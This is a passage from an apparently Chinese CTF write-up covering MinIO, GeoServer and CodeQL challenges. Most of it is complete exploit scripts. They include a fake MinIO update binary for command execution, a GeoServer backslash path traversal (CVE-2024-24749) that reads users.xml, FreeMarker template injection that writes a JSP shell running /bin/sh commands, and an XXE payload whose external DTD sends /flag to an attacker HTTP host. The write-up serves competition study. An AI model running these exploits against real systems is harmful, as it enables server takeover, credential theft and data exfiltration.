            "updatedAt": "2024-01-27T14:29:34.662930444Z",
        },
        separators=(",", ":"),
    )
    mapped = json.dumps(
        {"version": 1, "policy": "consoleAdmin", "updatedAt": "2024-01-27T14:29:34.662930444Z"}
    )
    r1 = post_policy(api, "config/iam/users/%s/identity.json" % NEW_AK, identity.encode())
    r2 = post_policy(api, "config/iam/policydb/users/%s.json" % NEW_AK, mapped.encode())
    if r1.status_code not in (200, 204):
        fail(r1)
    if r2.status_code not in (200, 204):
        fail(r2)
    info = None
    for _ in range(45):
        hdrs, _ = aws_sign("GET", host, "/minio/admin/v3/info", [], NEW_AK, NEW_SK)
        info = requests.get(api + "/minio/admin/v3/info", headers=hdrs, timeout=10)
        if info.status_code == 200:
            break
        time.sleep(1)
    if info is None or info.status_code != 200:
        fail(info)
    src = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fake_minio.go")
    blob_path = build_fake(src, cb, args.c, args.goarch)
    blob = open(blob_path, "rb").read()
    Handler.blob = blob
    Handler.name = RELNAME
    Handler.digest_line = (hashlib.sha256(blob).hexdigest() + "  " + RELNAME + "\n").encode()
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    update = "http://%s:%d/minio.sha256sum" % (vh, cb_port)
    path = "/minio/admin/v3/update"
    hdrs, cq = aws_sign("POST", host, path, [("updateURL", update)], NEW_AK, NEW_SK)
    ur = requests.post("%s%s?%s" % (api, path, cq), headers=hdrs, timeout=90)
    if ur.status_code != 200 and FLAG["data"] is None:
        fail(ur)
    for _ in range(80):
        if FLAG["data"] is not None:
            sys.stdout.buffer.write(FLAG["data"])
            if not FLAG["data"].endswith(b"\n"):
                sys.stdout.write("\n")
            httpd.shutdown()
            return
        time.sleep(0.25)
    fail(ur)


if __name__ == "__main__":
    main()

# python3 ./exp/exp_minioday.py -t 127.0.0.1:19000 --lhost 127.0.0.1 -c 'whoami;id'
# python3 ./exp/exp_minioday.py -t 127.0.0.1:19000 --lhost 127.0.0.1 -c 'cat /flag'

```
但是我猜测实际做题的师傅估计会被容器gank，这玩意只能打一次，因为用了假的东西fix

## 0x03 GeoServer Jive

README 是 Windows + JDK11 + Tomcat 9.0.85 + `geoserver.war` 2.24.1。装完要把 admin 密码从默认改掉，flag 在注册表。提示写得很清楚：预认证读文件拿 admin，再拼认证后 RCE；不出网。

### `/gwc/rest/web`

`gwc-rest-1.24.1` 里 `ByteStreamController` 匿名挂在 `/gwc/rest/web/**`：

```java
@RequestMapping(path = {"${gwc.context.suffix:}/rest"})
@Component
@RestController
public class ByteStreamController {
    volatile WebResourceBundle bundle;
    private static final WebResourceBundle DEFAULT_BUNDLE;
    static final Pattern UNSAFE_RESOURCE;

    static {
        Class<WebResourceBundle> cls = WebResourceBundle.class;
        DEFAULT_BUNDLE = cls::getResource;
        UNSAFE_RESOURCE = Pattern.compile("^/|/\\.\\./|^\\.\\./|\\.class$");
    }

    protected URL getResource(String path) {
        if (this.bundle == null) {
            synchronized (this) {
                if (this.bundle == null) {
                    List<WebResourceBundle> result = GeoWebCacheExtensions.extensions(WebResourceBundle.class);
                    if (result.isEmpty()) {
                        this.bundle = DEFAULT_BUNDLE;
                    } else {
                        this.bundle = result.get(0);
                    }
                }
            }
        }
        URL resource = this.bundle.apply(path);
        if (resource == null && this.bundle != DEFAULT_BUNDLE) {
            resource = DEFAULT_BUNDLE.apply(path);
        }
        return resource;
    }

    String getFileName(HttpServletRequest request) {
        String path = request.getPathInfo();
        if (path.indexOf("/rest/web") != 0) {
            path = path.substring(path.indexOf("/rest/web"));
        }
        return path.substring("/rest/web/".length());
    }

    @RequestMapping(value = {"/web/**"}, method = {RequestMethod.GET})
    ResponseEntity<?> doGet(HttpServletRequest request, HttpServletResponse response) {
        try {
            String filename = URLDecoder.decode(getFileName(request), "UTF-8");
            if (UNSAFE_RESOURCE.matcher(filename).find()) {
                return new ResponseEntity<>(HttpStatus.FORBIDDEN);
            }
            URL resource = getResource(filename);
            if (resource == null) {
                return new ResponseEntity<>(HttpStatus.NOT_FOUND);
            }
            String[] filenameParts = filename.split("\\.");
            String extension = filenameParts[filenameParts.length - 1];
            try {
                MimeType mime = MimeType.createFromExtension(extension);
                response.setContentType(mime.getFormat());
                try {
                    InputStream inputStream = resource.openStream();
                    try {
                        ServletOutputStream outputStream = response.getOutputStream();
                        try {
                            StreamUtils.copy(inputStream, outputStream);
                            if (outputStream != null) {
                                outputStream.close();
                            }
                            if (inputStream != null) {
                                inputStream.close();
                            }
                            return new ResponseEntity<>(HttpStatus.OK);
                        } catch (Throwable th) {
                            if (outputStream != null) {
                                try {
                                    outputStream.close();
                                } catch (Throwable th2) {
                                    th.addSuppressed(th2);
                                }
                            }
                            throw th;
                        }
                    } catch (Throwable th3) {
                        if (inputStream != null) {
                            try {
                                inputStream.close();
                            } catch (Throwable th4) {
                                th3.addSuppressed(th4);
                            }
                        }
                        throw th3;
                    }
                } catch (IOException e) {
                    return new ResponseEntity<>("Internal error", HttpStatus.INTERNAL_SERVER_ERROR);
                }
            } catch (MimeException e2) {
                return new ResponseEntity<>("Unable to create MimeType for " + extension, HttpStatus.INTERNAL_SERVER_ERROR);
            }
        } catch (UnsupportedEncodingException e1) {
            throw new IllegalStateException("Could not decode encoding UTF-8", e1);
        }
    }
}
```

正斜杠的 `../` 拦了，Windows 的 `..\` 没拦。`URLDecoder.decode` 还是第二次解码，`%255c` 能绕一层。这就是后来的 [CVE-2024-24749](https://github.com/geoserver/geoserver/security/advisories/GHSA-jhqx-5v5g-mpf3) / [GWC-1211](https://github.com/GeoWebCache/geowebcache/pull/1211)，2.24.1 正好在洞里。类 unix 环境这个洞是打不了的，但是这也不是任意文件读取，最多也就是到 admin 了。

```
GET /geoserver/gwc/rest/web/..\..\..\data\security\usergroup\default\users.xml
```

WAR 里这份 users.xml 是：

```xml
<user enabled="true" name="admin" password="digest1:D9miJH/hVgfxZJscMafEtbtliG0ROxhLfsznyWfG38X2pda2JOSV4POi55PQI4tw"/>
```

按 README 改完密码再读，hash 会变。

### `getSafeConfiguration`

`gs-main-2.24.1` 里认证后的 GetFeatureInfo HTML 走 FreeMarker，沙箱在 `TemplateUtils.getSafeConfiguration()`：

```java
static {
    ILLEGAL_FREEMARKER_CLASSES = Arrays.asList(
        ObjectConstructor.class.getName(),
        Execute.class.getName(),
        "freemarker.template.utility.JythonRuntime"
    );
    LEGAL_FREEMARKER_CLASSES = Arrays.asList();
}

public static Configuration getSafeConfiguration() {
    Configuration cfg = new Configuration(Configuration.DEFAULT_INCOMPATIBLE_IMPROVEMENTS);
    cfg.setNewBuiltinClassResolver((name, env, template) -> {
        if (ILLEGAL_FREEMARKER_CLASSES.stream().anyMatch(illegal -> name.equals(illegal))) {
            throw new TemplateException(String.format("Class %s is not allowed in Freemarker templates", name), env);
        }
        return TemplateClassResolver.SAFER_RESOLVER.resolve(name, env, template);
    });
    return cfg;
}
```

本地测试对着 2.24.1 的 `getSafeConfiguration()` 试过 `Execute?new()`、拼字符串再 `?new()`、Pwntester 那条 `protectionDomain.classLoader`，默认 `DefaultMemberAccessPolicy` 全部失败，`classLoader` 直接 missing，最后绕开 `?new()`，走 `feature.type.catalog.resourceLoader` 写文件，再用 `File.mkdir` / `renameTo` 丢到 Tomcat `webapps` 当 JSP。

GetFeatureInfo 把 `FeatureCollection` 丢进模板，catalog 活着的时候 `feature.type` 就是 `ResourceInfo`。`Catalog` 接口上就有 loader：

```java
GeoServerResourceLoader getResourceLoader();
```

```java
public File getBaseDirectory() {
    return baseDirectory;
}

@Override
public Resource get(String path) {
    return resources.get(path);
}

public ResourceStore getResourceStore() {
    return resources;
}
```

```java
InputStream in();
OutputStream out();
File file();
```

README 那套 Tomcat 里 data dir 在 `webapps/geoserver/data`，`parentFile` 就是爆炸开的 webapp：

```
<#list features as feature>
<#assign loader=feature.type.catalog.resourceLoader>
<#assign src=loader.get("www/drop.txt")>
<#assign os=src.out()>
${os.write(60)}${os.write(37)}${os.write(32)}${os.write(111)}${os.write(117)}${os.write(116)}${os.write(46)}${os.write(112)}${os.write(114)}${os.write(105)}${os.write(110)}${os.write(116)}${os.write(40)}${os.write(34)}${os.write(71)}${os.write(83)}${os.write(95)}${os.write(83)}${os.write(83)}${os.write(84)}${os.write(73)}${os.write(95)}${os.write(82)}${os.write(67)}${os.write(69)}${os.write(34)}${os.write(41)}${os.write(59)}${os.write(32)}${os.write(37)}${os.write(62)}
<#assign _c=os.close()>
<#assign dir=loader.baseDirectory.parentFile>
<#assign dest=dir.createTempFile("pwn", ".jsp", dir)>
<#assign _r=src.file().renameTo(dest)>
pwn=${dest.name}
<#break>
</#list>
```

exp 如下

```python
#!/usr/bin/env python3
import argparse
import re
import sys
import time
import requests

READS = [
    r"..\..\..\data\security\usergroup\default\users.xml",
    r"..\..\..\data\security\masterpw.xml",
    r"..\..\..\data\security\config.xml",
    r"..%5c..%5c..%5c..%5cdata%5csecurity%5cusergroup%5cdefault%5cusers.xml",
]


def fail(r):
    print(r.status_code)
    print(r.text[:800])
    sys.exit(1)


def read_files(base):
    last = None
    for name in READS:
        r = requests.get(base + "/gwc/rest/web/" + name, timeout=10)
        last = r
        if r.status_code == 200 and (
            "userRegistry" in r.text
            or "masterPassword" in r.text
            or "digest1:" in r.text
        ):
            sys.stdout.write(r.text)
            if not r.text.endswith("\n"):
                sys.stdout.write("\n")
            return True
    return False


def ftl_cmd(cmd):
    safe = cmd.replace("\\", "\\\\").replace("\"", "\\\"")
    jsp = (
        '<%java.util.Scanner s=new java.util.Scanner(Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","CMD"}).getInputStream()).useDelimiter("\\\\A");out.print(s.hasNext()?s.next():"");%>'
        .replace("CMD", safe)
    )
    writes = "".join("${os.write(%d)}" % ord(ch) for ch in jsp)
    return (
        "<#list features as feature>\n"
        "<#assign loader=feature.type.catalog.resourceLoader>\n"
        "<#assign opt=loader.baseDirectory.parentFile>\n"
        "<#assign webapps=opt>\n"
        "<#list opt.listFiles() as a>\n"
        "<#if a.name?starts_with(\"apache-tomcat\")>\n"
        "<#list a.listFiles() as b>\n"
        "<#if b.name==\"webapps\"><#assign webapps=b></#if>\n"
        "</#list>\n"
        "</#if>\n"
        "</#list>\n"
        "<#assign ctx=webapps.createTempFile(\"pwn\",\"\",webapps)>\n"
        "<#assign _d=ctx.delete()>\n"
        "<#assign _m=ctx.mkdir()>\n"
        "<#assign src=loader.get(\"www/drop.txt\")>\n"
        "<#assign os=src.out()>\n"
        + writes
        + "\n"
        "<#assign _c=os.close()>\n"
        "<#assign jspf=ctx.createTempFile(\"index\",\".jsp\",ctx)>\n"
        "<#assign _r=src.file().renameTo(jspf)>\n"
        "ctx=${ctx.name}\n"
        "jsp=${jspf.name}\n"
        "<#break>\n"
        "</#list>\n"
    )


def rce(base, user, password, workspace, datastore, featuretype, layer, cmd):
    auth = (user, password)
    ftl = ftl_cmd(cmd)
    paths = [
        "%s/rest/workspaces/%s/datastores/%s/featuretypes/%s/templates/content.ftl"
        % (base, workspace, datastore, featuretype),
        "%s/rest/workspaces/%s/templates/content.ftl" % (base, workspace),
    ]
    last = None
    for path in paths:
        last = requests.put(
            path,
            data=ftl.encode("utf-8"),
            headers={"Content-Type": "text/plain"},
            auth=auth,
            timeout=15,
        )
        if last.status_code in (200, 201):
            break
    else:
        fail(last)
    info = (
        "%s/wms?SERVICE=WMS&VERSION=1.1.1&REQUEST=GetFeatureInfo"
        "&LAYERS=%s&QUERY_LAYERS=%s&STYLES="
        "&BBOX=-100,30,-80,50&WIDTH=100&HEIGHT=100&X=50&Y=50"
        "&SRS=EPSG:4326&INFO_FORMAT=text/html"
        % (base, layer, layer)
    )
    r = requests.get(info, timeout=30)
    ctx = re.search(r"ctx=([A-Za-z0-9_.-]+)", r.text)
    jsp = re.search(r"jsp=([A-Za-z0-9_.-]+\.jsp)", r.text)
    if not ctx or not jsp:
        fail(r)
    root = base[: -len("/geoserver")] if base.endswith("/geoserver") else base
    u = "%s/%s/%s" % (root, ctx.group(1), jsp.group(1))
    g = None
    for _ in range(40):
        g = requests.get(u, timeout=15)
        if g.status_code == 200 and "HTTP Status 404" not in g.text and g.text.strip():
            sys.stdout.write(g.text)
            if not g.text.endswith("\n"):
                sys.stdout.write("\n")
            return
        time.sleep(0.5)
    fail(g)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", default="127.0.0.1:28080")
    ap.add_argument("-c", default="id")
    ap.add_argument("-u", "--user", default="admin")
    ap.add_argument("-p", "--password", default="geoserver")
    ap.add_argument("--workspace", default="topp")
    ap.add_argument("--datastore", default="states_shapefile")
    ap.add_argument("--featuretype", default="states")
    ap.add_argument("--layer", default="topp:states")
    args = ap.parse_args()
    t = args.target.rstrip("/")
    if t.startswith("http://") or t.startswith("https://"):
        base = t if t.endswith("/geoserver") else t + "/geoserver"
    else:
        base = "http://%s/geoserver" % t
    read_files(base)
    rce(
        base,
        args.user,
        args.password,
        args.workspace,
        args.datastore,
        args.featuretype,
        args.layer,
        args.c,
    )


if __name__ == "__main__":
    main()

# python3 ./exp/exp_geoserver.py -t 127.0.0.1:28080 -c 'whoami;id'
# python3 ./exp/exp_geoserver.py -t 127.0.0.1:28080 -c id -u admin -p geoserver

```


## 0x04 Protected-by-Java-SE

`codeql_agent` 听 `0.0.0.0:17878`，拉 CodeQL 2.15.5。启动参数里写死了：

```
/codeql/codeql/codeql query run -J-Djavax.xml.accessExternalDTD=all
```

用户名只许普通字符。菜单 1 是 `git clone`，URL 必须 `http://` 开头，菜单 2 写 ql 再跑。

clone 一个自建的 dumb HTTP git 仓库，根上放遗留的 `.dbinfo`。`com.semmle.util.db.DbInfo` 用 JAXB 解 XML，JVM 开了 `accessExternalDTD=all`，外部 DTD 直接能打。

```
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<lhost>:18084/x?f=%file;'>">
%eval;
%exfil;
```

跑 query 的时候解析 `.dbinfo`，HTTP 日志里：

```
DTD GET /evil.dtd
EXFIL /x?f=rwctf{test_flag}
```

ql 本身写 `select 1` 就行，数据库也不是正规 CodeQL DB，CLI 会报 Malformed XML。

exp 如下

```python
#!/usr/bin/env python3
import argparse
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler


class QuietGit(SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        return


class DtdHandler(BaseHTTPRequestHandler):
    hits = []
    file_uri = b"file:///flag"
    exfil = b""

    def log_message(self, fmt, *args):
        return

    def do_GET(self):
        DtdHandler.hits.append(self.path)
        if "evil.dtd" in self.path:
            body = (
                b"<!ENTITY %% file SYSTEM \"%s\">\n"
                b"<!ENTITY %% eval \"<!ENTITY &#x25; exfil SYSTEM '%s/x?f=%%file;'>\">\n"
                b"%%eval;\n"
                b"%%exfil;\n"
            ) % (DtdHandler.file_uri, DtdHandler.exfil)
            self.send_response(200)
            self.send_header("Content-Type", "application/xml")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")


def victim_host(target, lhost):
    th = target.split(":")[0]
    if lhost in ("127.0.0.1", "localhost", "::1") and th in ("127.0.0.1", "localhost", "::1"):
        return "host.docker.internal"
    return lhost


def recvall(sock, timeout=8):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 8192:
                break
    except Exception:
        pass
    return data


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", default="127.0.0.1:17878")
    ap.add_argument("--lhost", default="127.0.0.1")
    ap.add_argument("-c", default="file:///flag")
    ap.add_argument("--dtd-port", type=int, default=18084)
    ap.add_argument("--git-port", type=int, default=18085)
    args = ap.parse_args()
    vh = victim_host(args.target, args.lhost)
    host, port = args.target.rsplit(":", 1)
    uri = args.c if args.c.startswith("file:") else "file://" + args.c
    DtdHandler.file_uri = uri.encode()
    DtdHandler.exfil = ("http://%s:%d" % (vh, args.dtd_port)).encode()
    tmp = tempfile.mkdtemp(prefix="cqldb_")
    dbinfo = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foobar SYSTEM "http://%s:%d/evil.dtd">
<ns2:dbinfo xmlns:ns2="https://semmle.com/schemas/dbinfo">
    <sourceLocationPrefix>/opt/src</sourceLocationPrefix>
    <unicodeNewlines>false</unicodeNewlines>
    <columnKind>utf16</columnKind>
</ns2:dbinfo>
""" % (
        vh,
        args.dtd_port,
    )
    open(os.path.join(tmp, ".dbinfo"), "w").write(dbinfo)
    os.makedirs(os.path.join(tmp, "db-java", "default"), exist_ok=True)
    open(os.path.join(tmp, "db-java", "default", "x"), "w").write("x")
    open(os.path.join(tmp, "db-java", "semmlecode.dbscheme"), "w").write("//\n")
    subprocess.check_call(["git", "init", "-q"], cwd=tmp)
    subprocess.check_call(["git", "add", "-A"], cwd=tmp)
    subprocess.check_call(
        ["git", "-c", "user.email=a@b.c", "-c", "user.name=a", "commit", "-q", "-m", "x"],
        cwd=tmp,
    )
    subprocess.check_call(["git", "update-server-info"], cwd=tmp)
    dtd = HTTPServer(("0.0.0.0", args.dtd_port), DtdHandler)
    threading.Thread(target=dtd.serve_forever, daemon=True).start()
    os.chdir(os.path.join(tmp, ".git"))
    git = HTTPServer(("0.0.0.0", args.git_port), QuietGit)
    threading.Thread(target=git.serve_forever, daemon=True).start()
    s = socket.create_connection((host, int(port)), 10)
    recvall(s)
    s.sendall(("u%d\n" % int(time.time())).encode())
    recvall(s)
    s.sendall(b"1\n")
    recvall(s)
    s.sendall(("http://%s:%d/\n" % (vh, args.git_port)).encode())
    recvall(s, 25)
    recvall(s, 2)
    s.sendall(b"2\n")
    recvall(s, 8)
    recvall(s, 2)
    s.sendall(b"select 1\n")
    recvall(s, 20)
    for _ in range(80):
        for p in DtdHandler.hits:
            if "f=" in p:
                flag = p.split("f=", 1)[-1]
                sys.stdout.write(flag)
                if not flag.endswith("\n"):
                    sys.stdout.write("\n")
                dtd.shutdown()
                git.shutdown()
                return
        time.sleep(0.2)
    sys.exit(1)


if __name__ == "__main__":
    main()

# python3 ./exp/exp_codeql.py -t 127.0.0.1:17878 --lhost 127.0.0.1 -c /flag

```
